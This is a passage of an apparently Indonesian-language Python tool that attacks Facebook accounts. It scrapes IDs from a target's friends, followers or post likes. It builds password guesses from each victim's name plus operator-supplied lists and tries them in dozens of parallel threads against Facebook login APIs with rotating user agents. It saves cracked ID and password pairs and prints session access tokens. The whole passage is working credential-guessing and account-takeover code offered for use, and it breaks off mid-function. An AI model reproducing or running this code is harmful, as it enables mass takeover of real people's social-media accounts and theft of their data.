                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        emil(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        emil(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        emil(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        if len(id)<1:
                jalan (mx+k+" Tidak ada Akun Old ")
                os.system("rm id.txt")
                usup(mx+p+" Kembali")
                menu()
        os.system("rm id.txt")
        mode_password()

# PUBLIK

def publik():
	nom = 0
	try:
		token = open(".Emil.txt","r").read()
	except IOError:
		jalan(balmond+m+" Toket Basi")
		time.sleep(0.5)
		login()
	uid = usup("\n"+balmond+l+" Masukkan ID : "+b)
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		pintel = tulul["name"]
		emil(balmond+l+" Nama : "+pintel)
		id.append(uid+"|"+pintel)
	except KeyError:
		emil(balmond+m+" ID Salah")
		time.sleep(0.5)
		publik()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
				emil_lope_usup(b+jamet+u+" | "+p+junet)
			except:
				continue
		emil(balmond+l+" Total ID : "+h+"%s"%(len(id)))
		if len(id)<1:
			jalan(mx+m+" Akun Ini Tidak Memiliki Pertemanan/id Privat")
			time.sleep(3)
			menu()
		mode_password()
	except KeyError:
		pass
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# Usup ganteng tapi jomblo

def likess():
	token = open(".Emil.txt","r").read()
	idi = usup(mx+p+" Masukan id post : "+b)
	max = usup(mx+p+" Jumlah Max id   : ")
	try:
		ucup = requests.get("https://graph.facebook.com/"+idi+"/likes?limit="+max+"&access_token="+token)
		ganteng = json.loads(ucup.text)
		for kepin in ganteng["data"]:
			try:
				usup = kepin["id"]
				dela = kepin["name"]
				id.append(usup+"|"+dela)
				emil_lope_usup(b+usup+u+" | "+p+dela)
				time.sleep(1./200)
			except:
				continue
		emil(mx+p+" Total ID : "+b+"%s"%(len(id)))
		if len(id)==0:
			jalan(mx+k+" Maaf postingan ini tidak memiliki likes");time.sleep(0.5)
		else:
			mode_password()
	except (IOError,KeyError):
		jalan(mx+k+" Masukan ID Dengan Benar!!!")
		likess(token)
	except requests.exceptions.ConnectionError:
		jalan(mx+m+" Loss Konek")
		time.sleep(1)
		exit()

# Usup Ganteng Sejagat raya

def group(cookie):
	idi = usup(mx+p+" Masukan id group : "+b)
	max = usup(mx+p+" Jumlah Max id    : ")
#	try:
#		ucup = requests.get("https://graph.facebook.com/me/groups?access_token="+token)






# FOLLOWER

def follow():
	try:
		token = open(".Emil.txt","r").read()
	except IOError:
		jalan(balmond+m+" Toket Basi")
		time.sleep(0.5)
		login()
	uid = usup("\n"+balmond+l+" Masukkan ID  : "+b)
	try:
		jumlah = int(usup(balmond+l+" Mau Ambil Berapa ID : "))
		if jumlah>5000:
			jalan(balmond+m+" Maksimal 5000 ID")
			time.sleep(0.5)
			follow()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		follow()
	try:
		asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
		tulul = json.loads(asu.text)
		emil(balmond+l+" Nama : "+tulul["name"])
		id.append(uid+"|"+tulul["name"])
	except KeyError:
		emil(balmond+m+" ID Salah")
		time.sleep(0.5)
		follow()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		buriq = json.loads(bulu.text)
		for cew in buriq["data"]:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
				emil_lope_usup(b+jamet+u+" | "+p+junet)
				time.sleep(1./200)
			except:
				continue
		emil(balmond+l+" Total ID : "+h+"%s"%(len(id)))
		if len(id)<1:
			emil(mx+p+" Maaf Akun Ini Tidak Memiliki Folower")
			time.sleep(3)
			menu()
		mode_password()
	except requests.exceptions.ConnectionError:
		jalan(balmond+m+" Tidak Ada Internet")
		time.sleep(0.5)
		exit()

# MASSAL

def massal():
	try:
		token = open(".Emil.txt","r").read()
	except IOError:
		jalan(balmond+m+" Toket Basi")
		time.sleep(0.5)
		login()
	try:
		nada = int(usup("\n"+balmond+l+" Mau retas Berapa Target : "))
		if nada>10:
			jalan(balmond+m+" Maksimal 10 Target")
			time.sleep(0.5)
			massal()
	except ValueError:
		jalan(balmond+m+" Input Invalid")
		time.sleep(0.5)
		massal()
	for dot in range(nada):
		dot+=1
		tampung = []
		uid = usup(balmond+l+" Masukkan ID Ke %s : "%(dot)+b)
		try:
			asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
			tulul = json.loads(asu.text)
			emil(balmond+l+" Nama : "+tulul["name"])
		except KeyError:
			emil(balmond+m+" ID Salah")
			time.sleep(0.5)
			exit()
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Loss Konek")
			time.sleep(0.5)
			exit()
		try:
			bulu = requests.get("https://graph.facebook.com/"+uid+"/friends?limit=10000&access_token="+token)
			buriq = json.loads(bulu.text)
			for cew in buriq["data"]:
				try:
					jamet = cew["id"]
					junet = cew["name"]
					detec = jamet+"|"+junet
					emil(b+jamet+u+" | "+p+junet)
					time.sleep(1./200)
					if detec in id:
						continue
					else:
						id.append(jamet+"|"+junet)
						tampung.append(jamet+"|"+junet)
				except:
					continue
			emil(balmond+l+" Total ID : "+h+"%s\n"%(len(tampung)))
		except requests.exceptions.ConnectionError:
			jalan(balmond+m+" Tidak Ada Internet")
			time.sleep(0.5)
			exit()
	emil(balmond+l+" Jumlah Total ID : "+h+"%s"%(len(id)))
	mode_password()

# MODE PASSWORD

def mode_passTarget():
        mode = usup("\n"+balmond+l+" Masukan Password Tambahan Sebanyak-banyaknya!!! ?"+s+"\n        {"+u+"ENTER"+s+"}")
        if mode=="" or mode=="":
                emil("\n"+balmond+l+" Masukkan Password Tambahan")
                emil(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
                emil(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
                pwa = usup(balmond+l+" Password Tambahan : "+h+"")
                cewe = pwa.split(",")
                if len(cewe)>100:
                        jalan("\n"+balmond+m+" Jangan Serakah Ngab, Maksimal 100 Password Aja")
                        time.sleep(0.5)
                        mode_passTarget()
                for cowok in cewe:
                        if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
                                jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
                                time.sleep(0.5)
                                mode_passTarget()
                sandi.append(pwa)
                opsi3()
        else:
                jalan(balmond+m+" Tekan Enter ngaab")
                time.sleep(0.5)
                mode_passTarget()

def mode_password():
	emil(ris)
	emil(u+" ["+b+"PILIHAN PASSWORD"+u+"]")
	emil(u+" ["+m+"o1"+u+"]"+p+" Default")
	emil(u+" ["+m+"o2"+u+"]"+p+" Manual")
	emil(u+" ["+m+"o3"+u+"]"+p+" Gabungan")
	emil(ris)
	mode = usup(mx+p+" No : "+m)
	if mode=="1" or mode=="01":
		opsi()
	elif mode=="2" or mode=="02":
		emil("\n"+balmond+l+" Masukkan Password Manual")
		emil(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		emil(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = usup(balmond+l+" Password Manual : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>7:
			jalan("\n"+balmond+m+" Jangan Serakah ngab, Minimal 7 Password Aja")
			time.sleep(0.5)
			mode_password()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				mode_password()
		sandi.append(pwa)
		opsi2()
	elif mode=="3" or mode=="03":
		emil("\n"+balmond+l+" Masukkan Password Tambahan")
		emil(balmond+l+" Miniman 6 Karakter Dalam 1 Password")
		emil(balmond+l+" Contoh : "+k+"sayang,bismillah,katasandi")
		pwa = usup(balmond+l+" Password Tambahan : "+h+"")
		cewe = pwa.split(",")
		if len(cewe)>5:
			jalan("\n"+balmond+m+" Jangan Serakah Ngab, Maksimal 5 Password Aja")
			time.sleep(0.5)
			mode_password()
		for cowok in cewe:
			if len(cowok)==1 or len(cowok)==2 or len(cowok)==3 or len(cowok)==4 or len(cowok)==5:
				jalan("\n"+balmond+m+" Dalam 1 Password Minimal 6 Karakter")
				time.sleep(0.5)
				mode_password()
		sandi.append(pwa)
		opsi3()
	else:
		jalan(balmond+m+" Pilih yg bener tod...")
		time.sleep(1)
		mode_password()

# OPSI

def opsi():
	emil(ris)
	ops = usup(balmond+l+" Tampilkan Opsi "+u+"("+k+"y"+u+"/"+k+"t"+u+")"+l+" : "+k)
	if ops=="y" or ops=="Y":
		opsit.append("munculkan")
	elif ops=="t" or ops=="T":
		opsit.append("jangan")
	else:
		jalan(balmond+m+" Pilih Y Atau T tod...")
		time.sleep(0.5)
		opsi()
	mode_crack()

# OPSI2

def opsi2():
        emil(ris)
        ops = usup("\n"+balmond+l+" Tampilkan Opsi "+u+"("+k+"y/t"+u+")"+l+" : "+k)
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak Tod")
                time.sleep(0.5)
                opsi2()
        mode_crack2()

# OPSI3

def opsi3():
        emil(ris)
        ops = usup("\n"+balmond+l+" Tampilkan Opsi "+u+"("+k+"y/t"+u+")"+l+" : "+k)
        if ops=="y" or ops=="Y":
                opsit.append("munculkan")
        elif ops=="t" or ops=="T":
                opsit.append("jangan")
        else:
                jalan(balmond+m+" Pilih Ya Atau Tidak Tod")
                time.sleep(0.5)
                opsi3()
        mode_crack3()

# MODE CRACK
def ligat_gak():
	emil(ris)
	emil(u+" ["+m+"o1"+u+"]"+h+" Fast⚡")
	emil(u+" ["+m+"o2"+u+"]"+k+" Slow🐌")
	emil(ris)
	emiil=usup(mx+p+" No : "+m)
	if emiil=="2" or emiil=="02":
		katanya.append("santai")
	elif emiil=="1" or emiil=="01":
		katanya.append("ligat")
	else:
		jalan(mx+m+" Pilih yg bener tod..")
		ligat_gak()

def mode_crack():
	emil(ris)
	emil(u+" ["+m+"o1"+u+"]"+l+" Methode Api ")
	emil(u+" ["+m+"o2"+u+"]"+l+" Methode Mbasic ")
	emil(u+" ["+m+"o3"+u+"]"+l+" Method Free ")
	emil(ris)
	pilih = usup("\n"+balmond+l+" Pilih : "+m)
	ligat_gak()
	if pilih=="1" or pilih=="01":
		emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
		emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
		agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
		emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
		emil(balmond+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
		jalan(balmond+b+" Anjaay Hengker :v\n")
		default()
	elif pilih=="2" or pilih=="02":
		emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
		emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
		agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
		emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
		emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
		jalan(balmond+b+" Anjaay Hengker :v\n")
		default2()
	elif pilih=="3" or pilih=="03":
		emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
		emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
		agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
		if agenku=="y" or agenku=="Y":
			random_gak.append("random")
		else:
			kopi = "enak"
		emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
		emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
		emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
		jalan(balmond+b+" Anjaay Hengker :v\n")
		default3()
	else:
		jalan(balmond+l+" Gada Pilihan Metode Tod")
		time.sleep(0.5)
		mode_crack()

# MODE CRACK2

def mode_crack2():
        emil(ris)
        emil(u+" ["+m+"o1"+u+"]"+l+" Methode Api ")
        emil(u+" ["+m+"o2"+u+"]"+l+" Methode Mbasic ")
        emil(u+" ["+m+"o3"+u+"]"+l+" Methode free ")
        emil(ris)
        pilih = usup("\n"+balmond+l+" Pilih : "+m)
        ligat_gak()
        if pilih=="1" or pilih=="01":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjaay Hengker :v \n")
                manual()
        elif pilih=="2" or pilih=="02":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
                jalan(balmond+b+" Anjay Hengker :v\n")
                manual2()
        elif pilih=="3" or pilih=="03":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+u+"("+s+"Recomended"+u+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
                jalan(balmond+b+" Anjay Hengker :v\n")
                manual3()
        else:
                jalan(balmond+l+" Gada Pilihan Tod")
                time.sleep(0.5)
                mode_crack2()

# MODE CRACK3

def mode_crack3():
        emil(ris)
        emil(u+" ["+m+"o1"+u+"]"+l+" Method Api ")
        emil(u+" ["+m+"o2"+u+"]"+l+" Method Mbasic ")
        emil(u+" ["+m+"o3"+u+"]"+l+" Method Free ")
        emil(ris)
        pilih = usup("\n"+balmond+l+" Pilih : "+m)
        ligat_gak()
        if pilih=="1" or pilih=="01":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Jika Tidak Ada Hasil, Hidupkan Mode Pesawat 5 Detik")
                jalan(balmond+b+" Anjay Hengker :v\n")
                gabungkan()
        elif pilih=="2" or pilih=="02":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
                jalan(balmond+b+" Anjaay Hengker :v\n")
                gabungkan2()
        elif pilih=="3" or pilih=="03":
                emil("\n"+balmond+s+" Tekan "+h+"'y'"+s+" Untuk Random User Agent "+u+"("+k+"slow"+u+")")
                emil(balmond+s+" Tekan "+h+"'Enter'"+s+" Untuk 1 User Agent "+u+"("+h+"fast"+u+")")
                agenku = usup(balmond+l+" Gunakan User Agent Random "+s+"{"+u+"Recomended"+s+")"+l+" : ")
                if agenku=="y" or agenku=="Y":
                        random_gak.append("random")
                else:
                        kopi = "enak"
                emil("\n"+balmond+p+" File "+h+"Ok"+p+" : Hasil_Ok/"+hck)
                emil(balmond+p+" File "+k+"Cp"+p+" : Hasil_Cp/"+hck)
                emil(balmond+k+" Hidupkan Mode Pesawat 5 Menit Sekali")
                jalan(balmond+b+" Anjaay Hengker :v\n")
                gabungkan3()
        else:
                jalan(balmond+l+" Pilihan Invalid")
                time.sleep(0.5)
                mode_crack3()


# DEFAULT

def default():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			uid, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr+"321")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"321")
			past.append("katasandi123")
			past.append(namee.lower())
			pwx=past
			kintil.submit(api, uid, pwx, loop)

# DEFAULT2

def default2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        continue
                                else:
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==5 or len(xr)==6:
                                                past.append(xr)
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr+"321")
                                                past.append("katasandi123")
                                        else:
                                                past.append(xr)
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr+"321")
                        past.append(namee.lower())
                        kintil.submit(mbasic, idd, past, loop)
def default3():
	loop = 0
	with ThreadPoolExecutor(max_workers=50) as kintil:
		for yf in id:
			uid, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5 or len(xr)==6:
						past.append(xr)
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"321")
					else:
						past.append(xr)
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr+"123456")
			past.append("katasandi123")
			past.append(namee.lower())
			if "santai" in katanya:
				urel="https://free.facebook.com/login.php"
				herman=requests.get(urel).text
				sop = parser(herman,"html.parser")
				form = sop.find('form', id='login_form')
				url_post = form['action']
				wkt_dev = time.time()
				payload={}
				for ucupp in form:
					piput=ucupp
					try:
						payload[piput.get('name')] = piput.get('value')
					except:
						pass
			elif "ligat" in katanya:
				payload="usup_ganteng"

			pwx=past
			kintil.submit(smoke_sinte_efreeday, uid, pwx, loop, payload)

# MANUAL

def manual():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(api, idd, past, loop)

# MANUAL2

def manual2():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        idd, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        kintil.submit(mbasic, idd, past, loop)
def manual3():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        uid, namee = yf.split("|")
                        loop+=1
                        past = []
                        for wl in sandi:
                                wl = wl.lower()
                                for aj in wl.split(","):
                                        past.append(aj)
                        pwx=past
                        if "santai" in katanya:
                                urel="https://free.facebook.com/login.php"
                                herman=requests.get(urel).text
                                sop = parser(herman,"html.parser")
                                form = sop.find('form', id='login_form')
                                url_post = form['action']
                                wkt_dev = time.time()
                                payload={}
                                for ucupp in form:
                                        piput=ucupp
                                        try:
                                                payload[piput.get('name')] = piput.get('value')
                                        except:
                                                pass
                        else:
                                payload="usup_ganteng"
                        kintil.submit(mbasic, uid, pwx, loop)

# GABUNG

def gabungkan():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr)
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr)
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(api, idd, past, loop)

# GABUNGKAN2

def gabungkan2():
	loop = 0
	with ThreadPoolExecutor(max_workers=30) as kintil:
		for yf in id:
			idd, namee = yf.split("|")
			loop+=1
			past = []
			for xr in namee.split(" "):
				if len(xr)<3:
					continue
				else:
					xr = xr.lower()
					if len(xr)==3 or len(xr)==4 or len(xr)==5:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
					else:
						past.append(xr+"123")
						past.append(xr+"1234")
						past.append(xr+"12345")
						past.append(xr)
			past.append(namee.lower())
			for cicak in sandi:
				cicak = cicak.lower()
				for semut in cicak.split(","):
					past.append(semut)
			kintil.submit(mbasic, idd, past, loop)
def gabungkan3():
        loop = 0
        with ThreadPoolExecutor(max_workers=30) as kintil:
                for yf in id:
                        uid, namee = yf.split("|")
                        loop+=1
                        past = []
                        for xr in namee.split(" "):
                                if len(xr)<3:
                                        continue
                                else:
                                        xr = xr.lower()
                                        if len(xr)==3 or len(xr)==4 or len(xr)==5:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                        else:
                                                past.append(xr+"123")
                                                past.append(xr+"1234")
                                                past.append(xr+"12345")
                                                past.append(xr)
                        past.append(namee.lower())
                        for cicak in sandi:
                                cicak = cicak.lower()
                                for semut in cicak.split(","):
                                        past.append(semut)
                        if "santai" in katanya:
                                urel="https://free.facebook.com/login.php"
                                herman=requests.get(urel).text
                                sop = parser(herman,"html.parser")
                                form = sop.find('form', id='login_form')
                                url_post = form['action']
                                wkt_dev = time.time()
                                payload={}
                                for ucupp in form:
                                        piput=ucupp
                                        try:
                                                payload[piput.get('name')] = piput.get('value')
                                        except:
                                                pass
                        else:
                               payload="usup_ganteng"
                        pwx=past
                        kintil.submit(smoke_sinte_efreeday, uid, pwx, loop)

# SOND DE SIP
def okeh():
	os.system("cd ../../.sound && play-audio ok.wav")
def cepeh():
	os.system("cd ../../.sound && play-audio cp.wav")
# Api Panas
def api(uid,pwx,loop):
	if "random" in random_gak:
		ua = random.choice(kalo_random).replace("\n","")
	else:
		try:
			ua = open(".user.txt","r").read()
		except IOError:
			ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	emil(s+"\rʕ"+u+"McybearX"+s+"ʔ "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			pala=ses.headers.update = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			response = requests.get(api, params=params, headers=pala)
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					okeh()
					emil(u+"\rʕ"+u+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
					bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					okeh()
					emil(u+"\rʕ"+h+"ok"+u+"ʔ"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+response.json()["access_token"])
					bts = open("Hasil/Ok/%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
